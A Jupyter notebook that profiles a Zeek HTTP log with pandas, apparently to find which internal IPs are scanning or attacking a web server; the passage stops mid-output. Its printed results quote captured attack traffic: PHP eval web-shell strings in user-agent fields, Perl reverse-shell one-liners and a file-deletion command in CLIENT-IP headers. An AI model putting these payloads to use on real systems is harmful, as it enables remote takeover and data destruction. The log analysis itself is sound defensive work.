# %%
import pandas as pd
import csv
import os

# %%
# Generate http.csv from http.log in order to use pandas package for analysis

dic = {"http.log":['ts', 'uid', 'source_ip', 'source_port', 'destination_ip', 'destination_port', 
            'trans_depth', 'method', 'host', 'uri', 'referrer', 'user_agent', 'request_body_len', 
            'response_body_len', 'status_code', 'status_msg', 'info_code', 'info_msg', 'filename', 
            'tags', 'username', 'password', 'proxied', 'orig_fuids', 'orig_mime_types', 'resp_fuids', 
            'resp_mime_types']}
path = "./logs-processing"

for filename in os.listdir(path):
    if filename not in dic:
        continue
    with open(path + "/" + filename.replace("log", "csv"), 'w+', encoding = 'utf-8', newline = '') as csvfile:
        w = csv.writer(csvfile, dialect = 'excel')
        with open(path + "/" + filename, encoding = "utf8") as file:
            lines = file.read().split('\n')
            lines = lines[:-1]
            files = [dic[filename]]
        for line in lines:
            cells = []
            for item in line.split('\t'):
                if item == "-":
                    cells.append(item.replace("-", ""))
                else:
                    cells.append(item)
            files.append(cells)
        w.writerows(files)

# %%
# Get availability of column values

df = pd.read_csv("./logs-processing/http.csv")

# DataFrame with columns
columns = pd.DataFrame(list(df.columns.values[1:]))

# DataFrame with data types
data_types = pd.DataFrame(df.dtypes, columns=['Data Type'])

# DataFrame with Count
data_count = pd.DataFrame(df.count(), columns=['Count'])

# DataFrame with unique values
unique_value_counts = pd.DataFrame(columns=['Unique Values'])

for v in list(df.columns.values):
    unique_value_counts.loc[v] = [df[v].nunique()]
missing_data_counts = pd.DataFrame(df.isnull().sum(), columns = ['Missing Values'])
http_digestion_report = data_types.join(data_count).join(unique_value_counts).join(missing_data_counts)
print('HTTP Digestion Report')

http_digestion_report
# Out:
# C:\Users\gordo\anaconda3\lib\site-packages\IPython\core\interactiveshell.py:3418: DtypeWarning: Columns (17,22,23,24) have mixed types.Specify dtype option on import or set low_memory=False.
#   exec(code_obj, self.user_global_ns, self.user_ns)
# HTTP Digestion Report
#                   Data Type    Count Unique Values  Missing Values
# ts                  float64  2048442        668595               0
# uid                  object  2048442        479204               0
# source_ip            object  2048442            71               0
# source_port           int64  2048442         37686               0
# destination_ip       object  2048442            88               0
# destination_port      int64  2048442             8               0
# trans_depth           int64  2048442          1207               0
# method               object  2047566           143             876
# host                 object  2042003           315            6439
# uri                  object  2047566       1591739             876
# referrer             object   382520          2485         1665922
# user_agent           object  1977097          6560           71345
# request_body_len      int64  2048442           707               0
# response_body_len     int64  2048442          3839               0
# status_code         float64  2011424            24           37018
# status_msg           object  2011424            38           37018
# info_code           float64        2             1         2048440
# info_msg             object        2             1         2048440
# filename            float64        0             0         2048442
# tags                 object  2048442             2               0
# username             object     7146           120         2041296
# password            float64        0             0         2048442
# proxied              object     1154           183         2047288
# orig_fuids           object   133222        133222         1915220
# orig_mime_types      object   133222            18         1915220
# resp_fuids           object   705213        701396         1343229
# resp_mime_types      object   705213            29         1343229

# %%
# Sanity Checkpoint

df.head()
# Out:
#              ts                 uid       source_ip  source_port  \
# 0  1.331901e+09  CHEt7z3AzG4gyCNgci  192.168.202.79        50465
# 1  1.331901e+09  CKnDAp2ohlvN6rpiXl  192.168.202.79        50467
# 2  1.331901e+09  CNTrjn42F3LB58MZH6  192.168.202.79        50469
# 3  1.331901e+09  C1D7mK1PlzKEnEyG03  192.168.202.79        50471
# 4  1.331901e+09   CGF1bVMyl9ALKI32l  192.168.202.79        50473
#
#     destination_ip  destination_port  trans_depth method             host  \
# 0  192.168.229.251                80            1   HEAD  192.168.229.251
# 1  192.168.229.251                80            1   HEAD  192.168.229.251
# 2  192.168.229.251                80            1   HEAD  192.168.229.251
# 3  192.168.229.251                80            1   HEAD  192.168.229.251
# 4  192.168.229.251                80            1   HEAD  192.168.229.251
#
#               uri  ... info_msg filename     tags  username  password proxied  \
# 0  /DEASLog02.nsf  ...      NaN      NaN  (empty)       NaN       NaN     NaN
# 1  /DEASLog03.nsf  ...      NaN      NaN  (empty)       NaN       NaN     NaN
# 2  /DEASLog04.nsf  ...      NaN      NaN  (empty)       NaN       NaN     NaN
# 3  /DEASLog05.nsf  ...      NaN      NaN  (empty)       NaN       NaN     NaN
# 4    /DEASLog.nsf  ...      NaN      NaN  (empty)       NaN       NaN     NaN
#
#    orig_fuids orig_mime_types  resp_fuids resp_mime_types
# 0         NaN             NaN         NaN             NaN
# 1         NaN             NaN         NaN             NaN
# 2         NaN             NaN         NaN             NaN
# 3         NaN             NaN         NaN             NaN
# 4         NaN             NaN         NaN             NaN
#
# [5 rows x 27 columns]

# %%
# Get unique source IP addresses accessing the HTTP server

print('Unique source IP addresses:')
print(df.source_ip.unique())

print('\nNo. of unique source IP addresses: ', len(df.source_ip.unique()))
# Out:
# Unique source IP addresses:
# ['192.168.202.79' '192.168.202.76' '192.168.203.61' '192.168.203.62'
#  '192.168.204.70' '192.168.202.73' '192.168.202.90' '192.168.202.102'
#  '192.168.202.96' '192.168.202.110' '192.168.202.87' '192.168.202.83'
#  '192.168.203.45' '192.168.28.100' '192.168.202.112' '192.168.24.100'
#  '192.168.26.100' '192.168.27.100' '192.168.204.45' '192.168.202.103'
#  '192.168.203.64' '192.168.202.94' '192.168.202.115' '192.168.202.95'
#  '192.168.202.101' '192.168.202.100' '192.168.202.107' '192.168.202.80'
#  '192.168.202.108' '192.168.202.118' '192.168.203.63' '192.168.202.122'
#  '192.168.202.65' '192.168.25.100' '192.168.202.97'
#  '2001:dbb:c18:204:20c:29ff:fe4e:9e86' '192.168.26.254' '192.168.202.125'
#  '2001:dbb:c18:202:20c:29ff:fe93:571e' '192.168.202.109' '192.168.202.4'
#  '192.168.23.254' '192.168.202.88' '192.168.202.98' '192.168.23.100'
#  '192.168.22.100' '192.168.202.133' '192.168.202.91' '192.168.202.68'
#  '192.168.204.60' '192.168.202.135' '192.168.203.66' '192.168.202.138'
#  '192.168.24.253' '192.168.202.144' '192.168.202.140'
#  '2001:dbb:c18:202:20c:29ff:fe18:b667'
#  '2001:dbb:c18:202:20c:29ff:fe41:4be7' '192.168.202.141' '192.168.21.253'
#  '192.168.22.253' '192.168.28.253' '192.168.202.222' '192.168.202.136'
#  '192.168.202.143' '192.168.202.63' '192.168.202.64' '192.168.202.152'
#  '192.168.202.62' '192.168.202.153' '192.168.202.150']
#
# No. of unique source IP addresses:  71

# %%
# To check how many times each individual source IP accessed the HTTP server

for ip in df.source_ip.unique():
    ipobj = df.apply(lambda x: True if x['source_ip'] == ip else False, axis=1)
    numofaccess = len(ipobj[ipobj == True].index)
    print("IP", str(ip), "status:", str(numofaccess), "("+"{:.4f}".format(numofaccess/df.shape[0]*100), "%)")
# Out:
# IP 192.168.202.79 status: 232259 (11.3383 %)
# IP 192.168.202.76 status: 4497 (0.2195 %)
# IP 192.168.203.61 status: 161 (0.0079 %)
# IP 192.168.203.62 status: 223 (0.0109 %)
# IP 192.168.204.70 status: 1211 (0.0591 %)
# IP 192.168.202.73 status: 3 (0.0001 %)
# IP 192.168.202.90 status: 1750 (0.0854 %)
# IP 192.168.202.102 status: 212234 (10.3608 %)
# IP 192.168.202.96 status: 10487 (0.5120 %)
# IP 192.168.202.110 status: 169126 (8.2563 %)
# IP 192.168.202.87 status: 1040 (0.0508 %)
# IP 192.168.202.83 status: 35 (0.0017 %)
# IP 192.168.203.45 status: 1429 (0.0698 %)
# IP 192.168.28.100 status: 207 (0.0101 %)
# IP 192.168.202.112 status: 5631 (0.2749 %)
# IP 192.168.24.100 status: 6 (0.0003 %)
# IP 192.168.26.100 status: 20 (0.0010 %)
# IP 192.168.27.100 status: 10 (0.0005 %)
# IP 192.168.204.45 status: 1888 (0.0922 %)
# IP 192.168.202.103 status: 2785 (0.1360 %)
# IP 192.168.203.64 status: 393 (0.0192 %)
# IP 192.168.202.94 status: 544 (0.0266 %)
# IP 192.168.202.115 status: 34 (0.0017 %)
# IP 192.168.202.95 status: 418 (0.0204 %)
# IP 192.168.202.101 status: 53 (0.0026 %)
# IP 192.168.202.100 status: 318 (0.0155 %)
# IP 192.168.202.107 status: 32 (0.0016 %)
# IP 192.168.202.80 status: 155 (0.0076 %)
# IP 192.168.202.108 status: 1336 (0.0652 %)
# IP 192.168.202.118 status: 14032 (0.6850 %)
# IP 192.168.203.63 status: 1289498 (62.9502 %)
# IP 192.168.202.122 status: 268 (0.0131 %)
# IP 192.168.202.65 status: 6214 (0.3034 %)
# IP 192.168.25.100 status: 8 (0.0004 %)
# IP 192.168.202.97 status: 28 (0.0014 %)
# IP 2001:dbb:c18:204:20c:29ff:fe4e:9e86 status: 1 (0.0000 %)
# IP 192.168.26.254 status: 75 (0.0037 %)
# IP 192.168.202.125 status: 8794 (0.4293 %)
# IP 2001:dbb:c18:202:20c:29ff:fe93:571e status: 96 (0.0047 %)
# IP 192.168.202.109 status: 109 (0.0053 %)
# IP 192.168.202.4 status: 141 (0.0069 %)
# IP 192.168.23.254 status: 14 (0.0007 %)
# IP 192.168.202.88 status: 3 (0.0001 %)
# IP 192.168.202.98 status: 1 (0.0000 %)
# IP 192.168.23.100 status: 4 (0.0002 %)
# IP 192.168.22.100 status: 8 (0.0004 %)
# IP 192.168.202.133 status: 21 (0.0010 %)
# IP 192.168.202.91 status: 48 (0.0023 %)
# IP 192.168.202.68 status: 231 (0.0113 %)
# IP 192.168.204.60 status: 22 (0.0011 %)
# IP 192.168.202.135 status: 1 (0.0000 %)
# IP 192.168.203.66 status: 22 (0.0011 %)
# IP 192.168.202.138 status: 47379 (2.3129 %)
# IP 192.168.24.253 status: 1 (0.0000 %)
# IP 192.168.202.144 status: 168 (0.0082 %)
# IP 192.168.202.140 status: 28332 (1.3831 %)
# IP 2001:dbb:c18:202:20c:29ff:fe18:b667 status: 5 (0.0002 %)
# IP 2001:dbb:c18:202:20c:29ff:fe41:4be7 status: 106 (0.0052 %)
# IP 192.168.202.141 status: 685 (0.0334 %)
# IP 192.168.21.253 status: 1 (0.0000 %)
# IP 192.168.22.253 status: 1 (0.0000 %)
# IP 192.168.28.253 status: 1 (0.0000 %)
# IP 192.168.202.222 status: 35 (0.0017 %)
# IP 192.168.202.136 status: 470 (0.0229 %)
# IP 192.168.202.143 status: 109 (0.0053 %)
# IP 192.168.202.63 status: 711 (0.0347 %)
# IP 192.168.202.64 status: 177 (0.0086 %)
# IP 192.168.202.152 status: 97 (0.0047 %)
# IP 192.168.202.62 status: 128 (0.0062 %)
# IP 192.168.202.153 status: 13 (0.0006 %)
# IP 192.168.202.150 status: 2099 (0.1025 %)

# %%
# Sanity Checkpoint

df.query("source_ip == '192.168.203.63'")[:20]
# Out:
#                   ts                 uid       source_ip  source_port  \
# 149907  1.331914e+09   CI58Leqoe4pMvfAq6  192.168.203.63        57792
# 149913  1.331914e+09  CvJhVw4ZlXrJ3jkRLc  192.168.203.63        57793
# 149914  1.331914e+09   CI58Leqoe4pMvfAq6  192.168.203.63        57792
# 149915  1.331914e+09   CI58Leqoe4pMvfAq6  192.168.203.63        57792
# 149916  1.331914e+09  CTLXpR3xbXm0ykjBef  192.168.203.63        57794
# 149917  1.331914e+09  Cobl2S3PcJsfIoC624  192.168.203.63        57795
# 149918  1.331914e+09   CI58Leqoe4pMvfAq6  192.168.203.63        57792
# 149919  1.331914e+09  CmHcK54WqXcwVQEWZ2  192.168.203.63        57796
# 149920  1.331914e+09  CTLXpR3xbXm0ykjBef  192.168.203.63        57794
# 149921  1.331914e+09  Cobl2S3PcJsfIoC624  192.168.203.63        57795
# 149922  1.331914e+09   CI58Leqoe4pMvfAq6  192.168.203.63        57792
# 149941  1.331914e+09  CTLXpR3xbXm0ykjBef  192.168.203.63        57794
# 149961  1.331914e+09  Cobl2S3PcJsfIoC624  192.168.203.63        57795
# 150006  1.331914e+09   COlsob8ufbyEYJ1gl  192.168.203.63        57797
# 159082  1.331914e+09  CvSphT3TRjSVLeHtAc  192.168.203.63        57798
# 159085  1.331914e+09  CvSphT3TRjSVLeHtAc  192.168.203.63        57798
# 159088  1.331914e+09  CvSphT3TRjSVLeHtAc  192.168.203.63        57798
# 159091  1.331914e+09  CvSphT3TRjSVLeHtAc  192.168.203.63        57798
# 159094  1.331914e+09  CvSphT3TRjSVLeHtAc  192.168.203.63        57798
# 159100  1.331914e+09  CvSphT3TRjSVLeHtAc  192.168.203.63        57798
#
#         destination_ip  destination_port  trans_depth method            host  \
# 149907  192.168.23.103                80            1    GET  192.168.23.103
# 149913  192.168.23.103                80            1    GET  192.168.23.103
# 149914  192.168.23.103                80            2    GET  192.168.23.103
# 149915  192.168.23.103                80            3    GET  192.168.23.103
# 149916  192.168.23.103                80            1    GET  192.168.23.103
# 149917  192.168.23.103                80            1    GET  192.168.23.103
# 149918  192.168.23.103                80            4    GET  192.168.23.103
# 149919  192.168.23.103                80            1    GET  192.168.23.103
# 149920  192.168.23.103                80            2    GET  192.168.23.103
# 149921  192.168.23.103                80            2    GET  192.168.23.103
# 149922  192.168.23.103                80            5    GET  192.168.23.103
# 149941  192.168.23.103                80            3    GET  192.168.23.103
# 149961  192.168.23.103                80            3    GET  192.168.23.103
# 150006  192.168.23.103                80            1    GET  192.168.23.103
# 159082  192.168.23.103                80            1    GET  192.168.23.103
# 159085  192.168.23.103                80            2    GET  192.168.23.103
# 159088  192.168.23.103                80            3    GET  192.168.23.103
# 159091  192.168.23.103                80            4    GET  192.168.23.103
# 159094  192.168.23.103                80            5    GET  192.168.23.103
# 159100  192.168.23.103                80            6    GET  192.168.23.103
#
#                                                   uri  ... info_msg filename  \
# 149907                                              /  ...      NaN      NaN
# 149913                                   /favicon.ico  ...      NaN      NaN
# 149914  /interface/login/login_frame.php?site=default  ...      NaN      NaN
# 149915               /interface/themes/style_oemr.css  ...      NaN      NaN
# 149916                    /interface/login/filler.php  ...      NaN      NaN
# 149917               /interface/login/login_title.php  ...      NaN      NaN
# 149918                        /interface/pic/logo.gif  ...      NaN      NaN
# 149919                     /interface/login/login.php  ...      NaN      NaN
# 149920                /library/js/jquery-1.4.3.min.js  ...      NaN      NaN
# 149921           /sites/default/images/login_logo.gif  ...      NaN      NaN
# 149922                      /interface/pic/aquabg.gif  ...      NaN      NaN
# 149941                                   /favicon.ico  ...      NaN      NaN
# 149961                                   /favicon.ico  ...      NaN      NaN
# 150006                                   /favicon.ico  ...      NaN      NaN
# 159082                       /3342312465976896447.php  ...      NaN      NaN
# 159085             /interface/6608989053674357870.php  ...      NaN      NaN
# 159088       /interface/login/7724963424024840990.php  ...      NaN      NaN
# 159091             /interface/pic/2851197008106775546  ...      NaN      NaN
# 159094          /interface/themes/2253793709351725178  ...      NaN      NaN
# 159100                   /library/8246192002424111518  ...      NaN      NaN
#
#            tags  username  password                         proxied  \
# 149907  (empty)       NaN       NaN  PROXY-CONNECTION -> keep-alive
# 149913  (empty)       NaN       NaN  PROXY-CONNECTION -> keep-alive
# 149914  (empty)       NaN       NaN  PROXY-CONNECTION -> keep-alive
# 149915  (empty)       NaN       NaN  PROXY-CONNECTION -> keep-alive
# 149916  (empty)       NaN       NaN  PROXY-CONNECTION -> keep-alive
# 149917  (empty)       NaN       NaN  PROXY-CONNECTION -> keep-alive
# 149918  (empty)       NaN       NaN  PROXY-CONNECTION -> keep-alive
# 149919  (empty)       NaN       NaN  PROXY-CONNECTION -> keep-alive
# 149920  (empty)       NaN       NaN  PROXY-CONNECTION -> keep-alive
# 149921  (empty)       NaN       NaN  PROXY-CONNECTION -> keep-alive
# 149922  (empty)       NaN       NaN  PROXY-CONNECTION -> keep-alive
# 149941  (empty)       NaN       NaN  PROXY-CONNECTION -> keep-alive
# 149961  (empty)       NaN       NaN  PROXY-CONNECTION -> keep-alive
# 150006  (empty)       NaN       NaN  PROXY-CONNECTION -> keep-alive
# 159082  (empty)       NaN       NaN  PROXY-CONNECTION -> keep-alive
# 159085  (empty)       NaN       NaN  PROXY-CONNECTION -> keep-alive
# 159088  (empty)       NaN       NaN  PROXY-CONNECTION -> keep-alive
# 159091  (empty)       NaN       NaN  PROXY-CONNECTION -> keep-alive
# 159094  (empty)       NaN       NaN  PROXY-CONNECTION -> keep-alive
# 159100  (empty)       NaN       NaN  PROXY-CONNECTION -> keep-alive
#
#         orig_fuids orig_mime_types          resp_fuids  resp_mime_types
# 149907         NaN             NaN   FNisMJIalf7Oftg6b        text/html
# 149913         NaN             NaN  FVMarc1oItBH1icJ0g  application/xml
# 149914         NaN             NaN  FOzbtL2267lq4gki25        text/html
# 149915         NaN             NaN  FbGWmg2WeRO0VQ6Nf5       text/x-asm
# 149916         NaN             NaN  FgnSaD2sTTMjgcGhm8        text/html
# 149917         NaN             NaN  F76Pn24DyLOa0mg1Hj        text/html
# 149918         NaN             NaN  FkysY033bnspTTbTyc        image/gif
# 149919         NaN             NaN  FZIQ6H1aKj5r3gC6Qb        text/html
# 149920         NaN             NaN  FqqLBW2hk2wPVcpF4e       text/plain
# 149921         NaN             NaN  Ftye0641Aw804Timjf        image/gif
# 149922         NaN             NaN  F5YQhu1H89VxnQ2KEa        image/gif
# 149941         NaN             NaN  Figluz1QDmeCqlYC7l  application/xml
# 149961         NaN             NaN   FvSfJQJ9lppmI2tul  application/xml
# 150006         NaN             NaN  FBXyfy2puFB2lbNx7l  application/xml
# 159082         NaN             NaN  FRNwlW3ziEzfUWaIC5  application/xml
# 159085         NaN             NaN   FWkGnXIARsEkaaAE9  application/xml
# 159088         NaN             NaN  FvJsDB1twoH0QXanGc  application/xml
# 159091         NaN             NaN  FOrewV3l8D1KKzRlDc  application/xml
# 159094         NaN             NaN  F8bdI51IO75rvLuHp8  application/xml
# 159100         NaN             NaN  F5b2ms3qQo5rBdX8P1  application/xml
#
# [20 rows x 27 columns]

# %%
# To check request/response pairs by each unique source IP to understand request intention (NO DOMAIN KNOWLEDGE TO DECIDE
# WHICH IP IS PERFORMING RECONNAISSANCE ACTIVITIES AGAINST AN ENTERPRISE WEB SERVER)

# This action may provide clues to decide which IP addresses are suspicious

# columns_interest = ['method', 'host', 'uri', 'referrer', 'user_agent', 'request_body_len', 
#             'response_body_len', 'status_code', 'status_msg', 'info_code', 'info_msg', 'proxied']

for ip in df.source_ip.unique():
    
    df_temp = df.query("source_ip == {}".format(ip.split(' ')))
    
    print("IP: ", str(ip))
    print('\nMethod: ', df_temp.method.unique())
#     print('Host: ', df_temp.host.unique())
#     print('URI: ', df_temp.uri.unique())
#     print('Referrer: ', df_temp.referrer.unique())
    print('User Agent: ', df_temp.user_agent.unique())
#     print('Request Body Length: ', df_temp.request_body_len.unique())
#     print('Response Body Length: ', df_temp.response_body_len.unique())
    print('Status Code: ', df_temp.status_code.unique())
    print('Status Message: ', df_temp.status_msg.unique())
    print('Info Code: ', df_temp.info_code.unique())
    print('Info Message: ', df_temp.info_msg.unique())
    print('Proxied: ', df_temp.proxied.unique())
    print('\n\n')
# Out:
# IP:  192.168.202.79
#
# Method:  ['HEAD' 'GET' 'POST' 'OPTIONS' 'TRACE' 'PROPFIND' nan 'CONNECT' 'PUT'
#  'TRACK' 'DEBUG' 'get' 'INDEX' 'SEARCH' 'DELETE']
# User Agent:  ['Mozilla/5.0 (compatible; Nmap Scripting Engine; http://nmap.org/book/nse.html)'
#  nan
#  'Mozilla/5.0 (X11; Linux i686; rv:10.0.2) Gecko/20100101 Firefox/10.0.2'
#  ... 'Mozilla/4.0 (compatible; MSIE 5.0; Windows NT;)' 'Python-urllib/2.6'
#  'cadaver/0.23.3 neon/0.29.0']
# Status Code:  [404. 401. 200. 403. 500. 400.  nan 503. 405. 501. 206. 302. 303. 505.
#  304. 301. 201. 207. 204.]
# Status Message:  ['Not Found' 'Unauthorized' 'OK' 'Forbidden' 'Internal Server Error'
#  'Bad Request' nan 'Service Unavailable' 'NOT FOUND' 'Access denied'
#  'METHOD NOT ALLOWED' 'Not Implemented' 'Partial Content' 'Found'
#  'Not Allowed' '<empty>' 'See Other' 'Authorization Required'
#  'HTTP Version Not Supported' 'NOT MODIFIED' 'Moved Permanently'
#  'Method Not Allowed' 'Method Not Implemented' 'Moved Temporarily'
#  'Not Modified' 'Created' 'Multi-Status' 'No Content']
# Info Code:  [nan]
# Info Message:  [nan]
# Proxied:  [nan 'VIA -> SIP/2.0/TCP nm;branch=foo']
#
#
#
# IP:  192.168.202.76
#
# Method:  ['GET' 'POST']
# User Agent:  ['Mozilla/5.0 (Windows NT 6.1; WOW64; rv:10.0.2) Gecko/20100101 Firefox/10.0.2'
#  'Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 6.1; WOW64; Trident/4.0; EasyBits GO v1.0; SLCC2; .NET CLR 2.0.50727; .NET CLR 3.5.30729; .NET CLR 3.0.30729; Media Center PC 6.0; .NET4.0C; InfoPath.3; BRI/2)'
#  'XMLHTTP/1.0']
# Status Code:  [404. 200. 302. 401.  nan 304. 500.]
# Status Message:  ['Not Found' 'OK' 'Found' 'Unauthorized' nan 'Not Modified'
#  'Internal Server Error' 'NOT FOUND']
# Info Code:  [nan]
# Info Message:  [nan]
# Proxied:  [nan]
#
#
#
# IP:  192.168.203.61
#
# Method:  ['GET' 'POST' nan 'OPTIONS' 'HEAD' 'CONNECT']
# User Agent:  ['Mozilla/5.0 (X11; Linux i686; rv:10.0.2) Gecko/20100101 Firefox/10.0.2'
#  nan
#  'Mozilla/5.0 (compatible; Nmap Scripting Engine; http://nmap.org/book/nse.html)'
#  'Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1)']
# Status Code:  [200. 404. 401. 301. 403. 400. 302. 303. 500. 304.]
# Status Message:  ['OK' 'Not Found' 'Authorization Required' 'Moved Permanently' 'Forbidden'
#  '<empty>' 'Found' 'See Other' 'Internal Server Error' 'Bad Request'
#  'Not Modified']
# Info Code:  [nan]
# Info Message:  [nan]
# Proxied:  [nan]
#
#
#
# IP:  192.168.203.62
#
# Method:  ['GET' 'POST']
# User Agent:  ['Mozilla/5.0 (X11; Linux i686; rv:5.0.1) Gecko/20100101 Firefox/5.0.1']
# Status Code:  [200. 404. 401. 304. 302. 301.]
# Status Message:  ['OK' 'Not Found' 'Authorization Required' 'Not Modified' 'Found'
#  'Moved Permanently']
# Info Code:  [nan]
# Info Message:  [nan]
# Proxied:  [nan]
#
#
#
# IP:  192.168.204.70
#
# Method:  ['GET' 'POST']
# User Agent:  ['Mozilla/5.0 (X11; Linux i686; rv:5.0.1) Gecko/20100101 Firefox/5.0.1']
# Status Code:  [200. 304. 401. 301. 404. 302.]
# Status Message:  ['OK' 'Not Modified' 'Authorization Required' 'Moved Permanently'
#  'Not Found' 'Found' 'File not found']
# Info Code:  [nan]
# Info Message:  [nan]
# Proxied:  [nan]
#
#
#
# IP:  192.168.202.73
#
# Method:  ['GET']
# User Agent:  ['Mozilla/5.0 (X11; Linux i686; rv:2.0.1) Gecko/20100101 Firefox/4.0.1']
# Status Code:  [404.]
# Status Message:  ['Not Found']
# Info Code:  [nan]
# Info Message:  [nan]
# Proxied:  [nan]
#
#
#
# IP:  192.168.202.90
#
# Method:  ['GET' 'POST' nan]
# User Agent:  ['Mozilla/5.0 (X11; Linux i686; rv:5.0.1) Gecko/20100101 Firefox/5.0.1'
#  nan]
# Status Code:  [200. 404. 304. 302. 500.  nan 301. 400.]
# Status Message:  ['OK' 'NOT FOUND' 'NOT MODIFIED' 'FOUND' 'Internal Server Error' 'Found'
#  nan 'MOVED PERMANENTLY' 'Bad Request' 'Not Found' 'Not Modified']
# Info Code:  [nan]
# Info Message:  [nan]
# Proxied:  [nan]
#
#
#
# IP:  192.168.202.102
#
# Method:  ['RPC_CONNECT' 'GET' 'DELETE' 'HEAD' 'PUT' 'PROPFIND' 'POST' 'TRACE' nan
#  'SEARCH' 'OPTIONS']
# User Agent:  [nan
#  'Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 5.1; Trident/4.0; .NET CLR 1.1.4322; .NET CLR 2.0.50727; .NET CLR 3.0.4506.2152; .NET CLR 3.5.30729; LEN2; .NET4.0C)'
#  'Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 6.0)' '*/*' 'oh sure'
#  'Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 5.1; Trident/4.0)'
#  'Mozilla/5.0 (Windows; U; Windows NT 5.1; es-AR; rv:1.9.0.11) Gecko/2009060215 Firefox/3.0.11 (.NET CLR 3.5.30729)'
#  'Mozilla/4.0 (Windows XP 5.1) Java/1.6.0_23'
#  'Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 5.1; Trident/4.0; .NET CLR 1.1.4322; .NET CLR 2.0.50727; .NET CLR 3.0.4506.2152; .NET CLR 3.5.30729)'
#  'Mozilla Firefox'
#  'Mozilla/5.0 (Windows; U; Windows NT 5.1; es-AR; rv:1.9.1.1) Gecko/20090715 Firefox/3.5.1 (.NET CLR 3.5.30729)'
#  'chucky' 'xmlrpclib.py/1.0.1 (by www.pythonware.com)'
#  'Mozilla/5.0 (Windows NT 6.1; WOW64; rv:7.0.1) Gecko/20100101 Firefox/7.0.1'
#  'Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 5.1; .NET CLR 2.0.50727; .NET CLR 1.1.4322)'
#  'Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; SV1; .NET CLR 1.1.4322; .NET CLR 2.0.50727; .NET CLR 1.0.3705; InfoPath.1)'
#  'Mozilla/4.0 (compatible; SPIPE/1.0)'
#  'Opera/10.00 (Windows NT 5.1; U; en) Presto/2.2.0' 'Chucky12345768/1.0'
#  'Mozilla/4.0 (compatible; MSIE 9.0; Windows NT 6.1)'
#  "<?php eval($_POST['q34798287']);?>" "<?eval($_POST['q69129384']);?>"
#  "<?eval($_POST['q65325241']);?>" "<?php eval($_POST['q15428251']);?>"
#  "<?eval($_POST['q13631916']);?>" "<?php eval($_POST['q58632758']);?>"
#  "<?eval($_POST['q31999379']);?>"]
# Status Code:  [400. 200. 404. 405. 401. 403. 414. 304.  nan 302. 500. 413.]
# Status Message:  ['Bad Request' 'OK' 'Not Found' 'Method Not Allowed'
#  'Authorization Required' 'Forbidden' 'Unauthorized' 'NOT FOUND'
#  'Request-URI Too Large' 'Not Modified' nan 'Found' 'Not Allowed'
#  'Internal Server Error' 'METHOD NOT ALLOWED' 'Request Entity Too Large']
# Info Code:  [nan]
# Info Message:  [nan]
# Proxied:  [nan]
#
#
#
# IP:  192.168.202.96
#
# Method:  ['GET' 'POST' 'OPTIONS' nan 'SEARCH' 'DESCRIBE' 'HEAD' 'PUT']
# User Agent:  [nan
#  'A9WFXewh9PjH6EP39aFwSMgz9jmW422XT2kK1iN6iFZ4KpQsJ56zY5UfImxxdjQOsUxbBvaLaAujCjJ3Avy3yzGxK9p'
#  'Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1)'
#  'ArsRvwvYzLkOe2EyPTBKpsQhBut2nifjbs1LXyk3TNnkSh1WsCc8m2agik11dhASZUN8t0pDcQljcmgvtdxl8zDPP5c'
#  'gNDO0EeCcrKeNxRjbXmQ2JOdj3VZikq5Bov5gLiHS4Pnjo0jYF2iLuCkfgMLHE6e1vtJngaxb21pfCz'
#  'Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 6.0; Trident/4.0; SIMBAR={7DB0F6DE-8DE7-4841-9084-28FA914B0F2E}; SLCC1; .N'
#  'fPPc8Hor7FMPjs4PLxvUUL8a1wee2AFTShyop245RLTKo49fPewFCdYranjTAcI'
#  '4lX2BJxaPChB3PrZWg0d8GtWmF7L9UusFNY9QZuxLVTkLMiDxV9bg3PK8zDIpAdnybdjbX']
# Status Code:  [200. 302. 404. 403. 303. 414.  nan 400. 405. 500. 501.]
# Status Message:  ['OK' 'Found' 'Not Found' 'Forbidden' 'See Other' 'NOT FOUND'
#  'Request-URI Too Large' nan 'Bad Request' '<empty>' 'METHOD NOT ALLOWED'
#  'Internal Server Error' 'Method Not Implemented' 'Method Not Allowed']
# Info Code:  [nan]
# Info Message:  [nan]
# Proxied:  [nan
#  'CLIENT-IP -> perl -MIO -e \'$p=fork;exit\\x2cif($p);$c=new IO::Socket::INET(PeerAddr\\x2c"192.168.202.96:25686");STDIN->fdopen($c\\x2cr);$~->fdopen($c\\x2cw);system$_ while<>;\';'
#  'CLIENT-IP -> rm -f tiki-config.php'
#  'CLIENT-IP -> perl -MIO -e \'$p=fork;exit\\x2cif($p);$c=new IO::Socket::INET(PeerAddr\\x2c"192.168.202.96:14768");STDIN->fdopen($c\\x2cr);$~->fdopen($c\\x2cw);system$_ while<>;\';'
#  'CLIENT-IP -> perl -MIO -e \'$p=fork;exit\\x2cif($p);$c=new IO::Socket::INET(PeerAddr\\x2c"192.168.202.96:19127");STDIN->fdopen($c\\x2cr);$~->fdopen($c\\x2cw);system$_ while<>;\';'
#  'CLIENT-IP -> perl -MIO -e \'$p=fork;exit\\x2cif($p);$c=new IO::Socket::INET(PeerAddr\\x2c"192.168.202.96:6569");STDIN->fdopen($c\\x2cr);$~->fdopen($c\\x2cw);system$_ while<>;\';'
#  'CLIENT-IP -> perl -MIO -e \'$p=fork;exit\\x2cif($p);$c=new IO::Socket::INET(PeerAddr\\x2c"192.168.202.96:13598");STDIN->fdopen($c\\x2cr);$~->fdopen($c\\x2cw);system$_ while<>;\';'
#  'CLIENT-IP -> perl -MIO -e \'$p=fork;exit\\x2cif($p);$c=new IO::Socket::INET(PeerAddr\\x2c"192.168.202.96:30834");STDIN->fdopen($c\\x2cr);$~->fdopen($c\\x2cw);system$_ while<>;\';'
#  'CLIENT-IP -> perl -MIO -e \'$p=fork;exit\\x2cif($p);$c=new IO::Socket::INET(PeerAddr\\x2c"192.168.202.96:38699");STDIN->fdopen($c\\x2cr);$~->fdopen($c\\x2cw);system$_ while<>;\';']
#
#
#
# IP:  192.168.202.110
#
# Method:  ['GET' nan 'OPTIONS' 'POST' 'CONNECT' 'GNUTELLA' 'Secure' 'OEDNGQ'
